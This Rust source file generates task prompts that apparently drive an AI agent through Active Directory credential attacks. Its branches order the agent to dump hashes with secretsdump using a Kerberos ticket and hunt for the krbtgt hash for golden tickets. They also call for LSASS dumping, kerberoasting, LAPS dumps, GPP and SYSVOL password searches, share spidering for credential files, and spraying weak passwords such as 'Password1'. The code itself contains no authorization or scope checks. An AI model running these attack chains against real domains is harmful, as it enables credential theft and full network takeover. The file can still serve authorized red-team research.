//! Credential access task prompt generation.

use std::collections::HashMap;
use std::fmt::Write;

use serde_json::Value;

use super::helpers::{
    cred_display_str, cred_param_str, is_pass_the_hash_compatible, payload_techniques,
};
use super::state_context::format_state_context;
use super::StateSnapshot;

pub(crate) fn generate_credential_access_prompt(
    task_id: &str,
    payload: &Value,
    state: Option<&StateSnapshot>,
) -> anyhow::Result<String> {
    let hash_value = payload
        .get("hash_value")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty());
    let hash_is_pth = is_pass_the_hash_compatible(hash_value);

    let mut techniques = payload_techniques(payload);
    // Strip PtH-only techniques when hash isn't NTLM-compatible
    if hash_value.is_some() && !hash_is_pth {
        techniques.retain(|t| {
            let lower = t.to_lowercase();
            lower != "secretsdump" && lower != "lsassy"
        });
    }

    let targets: Vec<&str> = payload
        .get("target_ips")
        .and_then(|v| v.as_array())
        .map(|arr| arr.iter().filter_map(|v| v.as_str()).collect())
        .unwrap_or_default();
    let dc_ip = payload.get("dc_ip").and_then(|v| v.as_str()).unwrap_or("");
    let domain = payload.get("domain").and_then(|v| v.as_str()).unwrap_or("");
    let username = payload
        .get("username")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let password = payload
        .get("password")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let reason = payload.get("reason").and_then(|v| v.as_str()).unwrap_or("");

    let ticket_path = payload.get("ticket_path").and_then(|v| v.as_str());
    let no_pass = payload
        .get("no_pass")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let has_password = !password.is_empty();
    let has_hash = hash_value.is_some();
    let has_creds = has_password || (hash_is_pth && has_hash);

    // -----------------------------------------------------------------------
    // Branch 1: Kerberos ticket-based secretsdump (from S4U chain)
    // -----------------------------------------------------------------------
    if ticket_path.is_some() && no_pass && techniques.iter().any(|t| t == "secretsdump") {
        let target = targets.first().copied().unwrap_or("");
        let user = if username.is_empty() {
            "Administrator"
        } else {
            username
        };
        let ticket = ticket_path.unwrap_or("");
        let mut prompt = format!(
            "**KERBEROS TICKET-BASED SECRETSDUMP**\n\n\
             Target: {target}\n\
             Domain: {domain}\n\
             Username: {user}\n\
             Ticket Path: {ticket}\n\
             DC IP: {dc_ip_display}\n\
             Task ID: {task_id}\n\n\
             **CRITICAL: You have a Kerberos ticket from S4U attack!**\n\
             This ticket allows you to impersonate Administrator to the target.\n\n\
             **EXECUTE secretsdump with Kerberos ticket:**\n\
             secretsdump(\n\
                 target='{target}',\n\
                 username='{user}',\n\
                 no_pass=True,\n\
                 ticket_path='{ticket}'",
            dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
        );
        if !dc_ip.is_empty() {
            write!(prompt, ",\n    dc_ip='{dc_ip}'").unwrap();
        }
        prompt.push_str(
            "\n)\n\n\
             **IMPORTANT:**\n\
             - The ticket_path sets KRB5CCNAME for Kerberos auth\n\
             - no_pass=True tells secretsdump to use -k -no-pass\n\
             - This will dump SAM, LSA secrets, and domain hashes if on a DC\n\n\
             If secretsdump succeeds, look for:\n\
             - krbtgt hash -> GOLDEN TICKET capability\n\
             - Administrator hash -> DOMAIN ADMIN ACHIEVED\n\n\
             Report any hashes found in JSON format:\n\
             ```json\n\
             {\"hash\": {\"username\": \"Administrator\", \"hash_value\": \"...\", \
              \"hash_type\": \"NTLM\", \"domain\": \"...\"}}\n\
             ```",
        );
        if let Some(s) = state {
            prompt.push_str(&format_state_context(s, "credential_access", Some(target)));
        }
        return Ok(prompt);
    }

    // Determine low-hanging-fruit flags
    let has_sysvol = techniques
        .iter()
        .any(|t| t == "sysvol_script_search" || t == "gpp_password_finder");
    let has_spray = techniques
        .iter()
        .any(|t| t == "username_as_password" || t == "password_spray");
    let has_low_hanging =
        reason.to_lowercase().contains("low_hanging_fruit") || has_sysvol || has_spray;

    // -----------------------------------------------------------------------
    // Branch 2: Low-hanging fruit WITH credentials
    // -----------------------------------------------------------------------
    if has_low_hanging && has_password {
        let mut prompt = format!(
            "Perform LOW HANGING FRUIT credential harvesting:\n\
             Domain: {domain}\n\
             DC IP: {dc_ip_display}\n\
             Username: {user_display}\n\
             Password: {password}\n\
             Task ID: {task_id}\n\n\
             **EXECUTE IN THIS ORDER:**\n\
             1. gpp_password_finder(target=DC_IP, username=USER, password=PASS, domain=DOMAIN)\n\
             2. sysvol_script_search(target=DC_IP, username=USER, password=PASS, domain=DOMAIN)\n\
             3. ldap_search_descriptions(...) - check for passwords in LDAP descriptions\n\
             4. username_as_password(...) - check for user=password accounts\n\n\
             These are HIGH SUCCESS RATE techniques that find hardcoded credentials.\n\
             Report any credentials found immediately.",
            dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
            user_display = if username.is_empty() { "N/A" } else { username },
        );
        if let Some(s) = state {
            prompt.push_str(&format_state_context(s, "credential_access", Some(dc_ip)));
        }
        return Ok(prompt);
    }

    // -----------------------------------------------------------------------
    // Branch 3: Username-as-password spray (new users)
    // -----------------------------------------------------------------------
    let is_username_spray = techniques.iter().any(|t| t == "username_as_password")
        && reason.to_lowercase().contains("new_users");
    if is_username_spray {
        let mut cred_line = String::new();
        if !username.is_empty() && !password.is_empty() {
            write!(
                cred_line,
                "**Use these credentials for user enumeration:**\n\
                 Username: {username}\n\
                 Password: {password}\n\n"
            )
            .unwrap();
        }
        let mut prompt = format!(
            "Perform USERNAME_AS_PASSWORD spray to find weak credentials:\n\
             Domain: {domain}\n\
             DC IP: {dc_ip_display}\n\
             Task ID: {task_id}\n\n\
             {cred_line}\
             **EXECUTE username_as_password:**\n\
             1. First save users: save_users_to_file(target='{dc_ip}', username='{username}', \
                password='{password}', domain='{domain}')\n\
             2. Then spray: username_as_password(target='{dc_ip}', domain='{domain}', \
                users_file='/tmp/users.txt')\n\n\
             This tests if users have username=password (e.g., testuser:testuser).\n\
             Zero lockout risk, one attempt per user.\n\
             Report any credentials found immediately.",
            dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
        );
        if let Some(s) = state {
            prompt.push_str(&format_state_context(s, "credential_access", Some(dc_ip)));
        }
        return Ok(prompt);
    }

    // -----------------------------------------------------------------------
    // Branch 4: Share spider with GPP
    // -----------------------------------------------------------------------
    let is_share_spider = techniques.iter().any(|t| t == "share_spider");
    if is_share_spider && has_password {
        let target_ip = targets.first().copied().unwrap_or("");
        let share_name = if reason.to_lowercase().contains("auto_share_spider_") {
            reason
                .to_lowercase()
                .split("auto_share_spider_")
                .last()
                .unwrap_or("")
                .to_string()
        } else {
            String::new()
        };
        let share_hint = if share_name.is_empty() {
            "enumerate all readable shares"
        } else {
            &share_name
        };
        let share_param = if share_name.is_empty() {
            "all"
        } else {
            &share_name
        };

        let mut prompt = format!(
            "**SHARE SPIDER TASK - Search SMB shares for credentials**\n\n\
             Target: {target_ip}\n\
             Domain: {domain}\n\
             Username: {username}\n\
             Password: {password}\n\
             Share hint: {share_hint}\n\
             Task ID: {task_id}\n\n\
             **INSTRUCTIONS:**\n\
             1. Use smbclient_spider(target='{target_ip}', share='{share_param}', \
                username='{username}', password='{password}', domain='{domain}')\n\
             2. Look for interesting files containing credentials:\n\
                - *.txt files (passwords, connection strings)\n\
                - *.xml, *.ini, *.config files (configuration with creds)\n\
                - *.ps1, *.bat, *.cmd files (scripts with hardcoded passwords)\n\
             3. If files are found, use smb_download_file to retrieve them\n\
             4. Parse downloaded files for credentials\n\n\
             **COMMON FINDINGS:**\n\
             - Service account passwords in config files\n\
             - Database connection strings with credentials\n\
             - Admin passwords in deployment scripts\n\
             - User credentials in text files (e.g., secret.txt)\n\n\
             Report any credentials found immediately!"
        );
        if let Some(s) = state {
            prompt.push_str(&format_state_context(
                s,
                "credential_access",
                Some(target_ip),
            ));
        }
        return Ok(prompt);
    }

    // -----------------------------------------------------------------------
    // Branch 5: Technique enforcement WITHOUT credentials
    // -----------------------------------------------------------------------
    let no_cred_techniques = !has_password && !has_hash;
    if !techniques.is_empty() && no_cred_techniques {
        let no_cred_map: HashMap<&str, String> = [
            (
                "asrep_roast",
                format!(
                    "asrep_roast(target='{dc_ip}', domain='{domain}') \
                     - find users without Kerberos pre-auth"
                ),
            ),
            (
                "username_as_password",
                format!(
                    "username_as_password(target='{dc_ip}', domain='{domain}') \
                     - test if users have username=password (e.g., testuser:testuser)"
                ),
            ),
            (
                "password_spray",
                format!(
                    "password_spray(target='{dc_ip}', domain='{domain}', \
                     password='Password1') - try common passwords"
                ),
            ),
            (
                "kerberos_user_enum_noauth",
                format!(
                    "kerberos_user_enum_noauth(target='{dc_ip}', domain='{domain}') \
                     - enumerate valid usernames via Kerberos"
                ),
            ),
        ]
        .into_iter()
        .collect();

        let mut instructions = Vec::new();
        for (i, technique) in techniques.iter().enumerate() {
            let idx = i + 1;
            if let Some(desc) = no_cred_map.get(technique.as_str()) {
                instructions.push(format!("{idx}. {desc}"));
            } else {
                instructions.push(format!("{idx}. {technique}(...)"));
            }
        }

        if !instructions.is_empty() {
            let targets_display = if targets.is_empty() {
                "N/A".to_string()
            } else {
                targets.join(", ")
            };
            let mut prompt = format!(
                "**MANDATORY TECHNIQUE EXECUTION (NO CREDENTIALS)**\n\n\
                 Domain: {domain}\n\
                 DC IP: {dc_ip_display}\n\
                 Targets: {targets_display}\n\
                 Task ID: {task_id}\n\n\
                 **CRITICAL: YOU MUST EXECUTE THESE TECHNIQUES IN ORDER:**\n\
                 **DO NOT run smb_sweep or other slow recon first!**\n\
                 **Complete assigned techniques BEFORE doing anything else.**\n\n\
                 {instructions_text}\n\n\
                 **WORKFLOW:**\n\
                 1. Execute EACH technique above in order\n\
                 2. Report ANY credentials/hashes found immediately\n\
                 3. Only after completing ALL assigned techniques, mark task complete\n\n\
                 **DO NOT:**\n\
                 - Run smb_sweep (wastes 5+ minutes, not your job)\n\
                 - Do additional enumeration before completing assigned techniques\n",
                dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
                instructions_text = instructions.join("\n"),
            );
            if let Some(s) = state {
                prompt.push_str(&format_state_context(s, "credential_access", Some(dc_ip)));
            }
            return Ok(prompt);
        }
    }

    // -----------------------------------------------------------------------
    // Branch 6: Low-hanging fruit WITHOUT credentials
    // -----------------------------------------------------------------------
    if has_low_hanging && !has_password && !has_hash {
        let mut prompt = format!(
            "Perform LOW HANGING FRUIT credential discovery (NO CREDENTIALS):\n\
             Domain: {domain}\n\
             DC IP: {dc_ip_display}\n\
             Task ID: {task_id}\n\n\
             **CRITICAL: These techniques work WITHOUT credentials to discover passwords:**\n\
             1. username_as_password(target=DC_IP, domain=DOMAIN) - HIGH SUCCESS RATE\n\
                Tests if users have username=password (e.g., testuser:testuser)\n\
                Zero lockout risk, one attempt per user\n\n\
             2. password_spray - YOU MUST CALL THIS ONCE FOR EACH PASSWORD:\n\
                password_spray(target=DC_IP, domain=DOMAIN, password='Password1')\n\
                password_spray(target=DC_IP, domain=DOMAIN, password='Welcome1')\n\
                password_spray(target=DC_IP, domain=DOMAIN, password='Summer2024')\n\
                password_spray(target=DC_IP, domain=DOMAIN, password='Company123')\n\
                password_spray(target=DC_IP, domain=DOMAIN, password='Passw0rd!')\n\
                **Call spray for EACH password above - common weak passwords**\n\n\
             3. password_policy(target=DC_IP, domain=DOMAIN) - Check lockout before spraying\n\n\
             These are the FIRST techniques to run when you have no credentials.\n\
             Report any credentials found immediately.",
            dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
        );
        if let Some(s) = state {
            prompt.push_str(&format_state_context(s, "credential_access", Some(dc_ip)));
        }
        return Ok(prompt);
    }

    // -----------------------------------------------------------------------
    // Branch 7: Technique enforcement WITH credentials
    // -----------------------------------------------------------------------
    if !techniques.is_empty() && has_creds {
        let cred_param = cred_param_str(payload, hash_value);
        let cred_display = cred_display_str(payload, hash_value);

        let technique_map: HashMap<&str, String> = [
            (
                "sysvol_script_search",
                format!(
                    "sysvol_script_search(target='{dc_ip}', username='{username}', \
                     {cred_param}, domain='{domain}') \
                     - ~2 seconds, finds hardcoded passwords in login scripts"
                ),
            ),
            (
                "gpp_password_finder",
                format!(
                    "gpp_password_finder(target='{dc_ip}', username='{username}', \
                     {cred_param}, domain='{domain}') \
                     - ~2 seconds, finds GPP/cpassword credentials"
                ),
            ),
            (
                "ldap_search_descriptions",
                format!(
                    "ldap_search_descriptions(target='{dc_ip}', username='{username}', \
                     {cred_param}, domain='{domain}') \
                     - finds passwords in LDAP description fields"
                ),
            ),
            (
                "kerberoast",
                format!(
                    "kerberoast(domain='{domain}', username='{username}', \
                     {cred_param}, dc_ip='{dc_ip}') \
                     - service account hashes (uses correct DC for the domain)"
                ),
            ),
            (
                "secretsdump",
                format!(
                    "secretsdump(target='{dc_ip}', username='{username}', \
                     {cred_param}, domain='{domain}') \
                     - dump hashes (requires admin)"
                ),
            ),
            (
                "lsassy",
                format!(
                    "lsassy(target='{dc_ip}', username='{username}', \
                     {cred_param}, domain='{domain}') \
                     - LSASS memory dump"
                ),
            ),
            (
                "laps_dump",
                format!(
                    "laps_dump(target='{dc_ip}', username='{username}', \
                     {cred_param}, domain='{domain}') \
                     - LAPS local admin passwords"
                ),
            ),
        ]
        .into_iter()
        .collect();

        let mut instructions = Vec::new();
        for (i, technique) in techniques.iter().enumerate() {
            let idx = i + 1;
            if let Some(desc) = technique_map.get(technique.as_str()) {
                instructions.push(format!("{idx}. {desc}"));
            } else {
                instructions.push(format!("{idx}. {technique}(...)"));
            }
        }

        if !instructions.is_empty() {
            let targets_display = if targets.is_empty() {
                "N/A".to_string()
            } else {
                targets.join(", ")
            };
            let mut prompt = format!(
                "**MANDATORY TECHNIQUE EXECUTION**\n\n\
                 Domain: {domain}\n\
                 DC IP: {dc_ip_display}\n\
                 Targets: {targets_display}\n\
                 Username: {user_display}\n\
                 Credential: {cred_display}\n\
                 Task ID: {task_id}\n\n\
                 **CRITICAL: YOU MUST EXECUTE THESE TECHNIQUES IN ORDER:**\n\
                 **DO NOT run smb_sweep, kerberos_user_enum, or other recon first!**\n\
                 **These techniques are FAST (~2-5 seconds each) and HIGH VALUE.**\n\n\
                 {instructions_text}\n\n\
                 **WORKFLOW:**\n\
                 1. Execute EACH technique above in order - they are FAST\n\
                 2. Report ANY credentials found immediately\n\
                 3. Only after completing ALL assigned techniques, mark task complete\n\n\
                 **DO NOT:**\n\
                 - Run smb_sweep (wastes 5+ minutes)\n\
                 - Run kerberos_user_enum_noauth (not your job)\n\
                 - Do additional recon before completing assigned techniques\n",
                dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
                user_display = if username.is_empty() { "N/A" } else { username },
                instructions_text = instructions.join("\n"),
            );
            if let Some(s) = state {
                prompt.push_str(&format_state_context(s, "credential_access", Some(dc_ip)));
            }
            return Ok(prompt);
        }
    }

    // -----------------------------------------------------------------------
    // Generic fallback — uses Tera template
    // -----------------------------------------------------------------------
    let cred_type = if has_password {
        "password"
    } else if has_hash {
        if hash_is_pth {
            "hash"
        } else {
            "hash (non-NTLM)"
        }
    } else {
        "none"
    };
    let hash_note = if has_hash && !hash_is_pth {
        "NOTE: Provided hash is not NTLM pass-the-hash compatible; \
         do not attempt secretsdump/lsassy with it.\n"
    } else {
        ""
    };
    let cred_value = if has_password {
        password
    } else {
        hash_value.unwrap_or("N/A")
    };
    let source = payload
        .get("credential_source")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let hash_type = payload
        .get("hash_type")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let techniques_display = if techniques.is_empty() {
        "auto-select".to_string()
    } else {
        techniques.join(", ")
    };
    let targets_display = if targets.is_empty() {
        "N/A".to_string()
    } else {
        targets.join(", ")
    };

    let mut prompt = format!(
        "Perform credential access against the target environment:\n\
         Domain: {domain}\n\
         Targets: {targets_display}\n\
         DC IP: {dc_ip_display}\n\
         Username: {user_display}\n\
         Credential ({cred_type}): {cred_value}\n",
        dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
        user_display = if username.is_empty() { "N/A" } else { username },
    );
    if !hash_type.is_empty() {
        let _ = writeln!(prompt, "Hash Type: {hash_type}");
    }
    if !source.is_empty() {
        let _ = writeln!(prompt, "Credential Source: {source}");
    }
    if !reason.is_empty() {
        let _ = writeln!(prompt, "Reason: {reason}");
    }
    let _ = writeln!(prompt, "Techniques: {techniques_display}");
    let _ = writeln!(prompt, "Task ID: {task_id}\n");
    if !hash_note.is_empty() {
        let _ = writeln!(prompt, "{hash_note}");
    }
    prompt.push_str(
        "Use the exact credential value above; do not substitute placeholders. \
         If DC IP is provided, pass -dc-ip to Kerberos/LDAP tools to avoid DNS issues. \
         **PRIORITY ORDER when creds available:**\n\
         1. gpp_password_finder + sysvol_script_search (LOW HANGING FRUIT - run first!)\n\
         2. Kerberoast for service account hashes\n\
         3. secretsdump if admin access exists\n\
         4. LSASS dumping if viable\n\
         Report any hashes or credentials found.",
    );
    if let Some(s) = state {
        prompt.push_str(&format_state_context(s, "credential_access", Some(dc_ip)));
    }
    Ok(prompt)
}
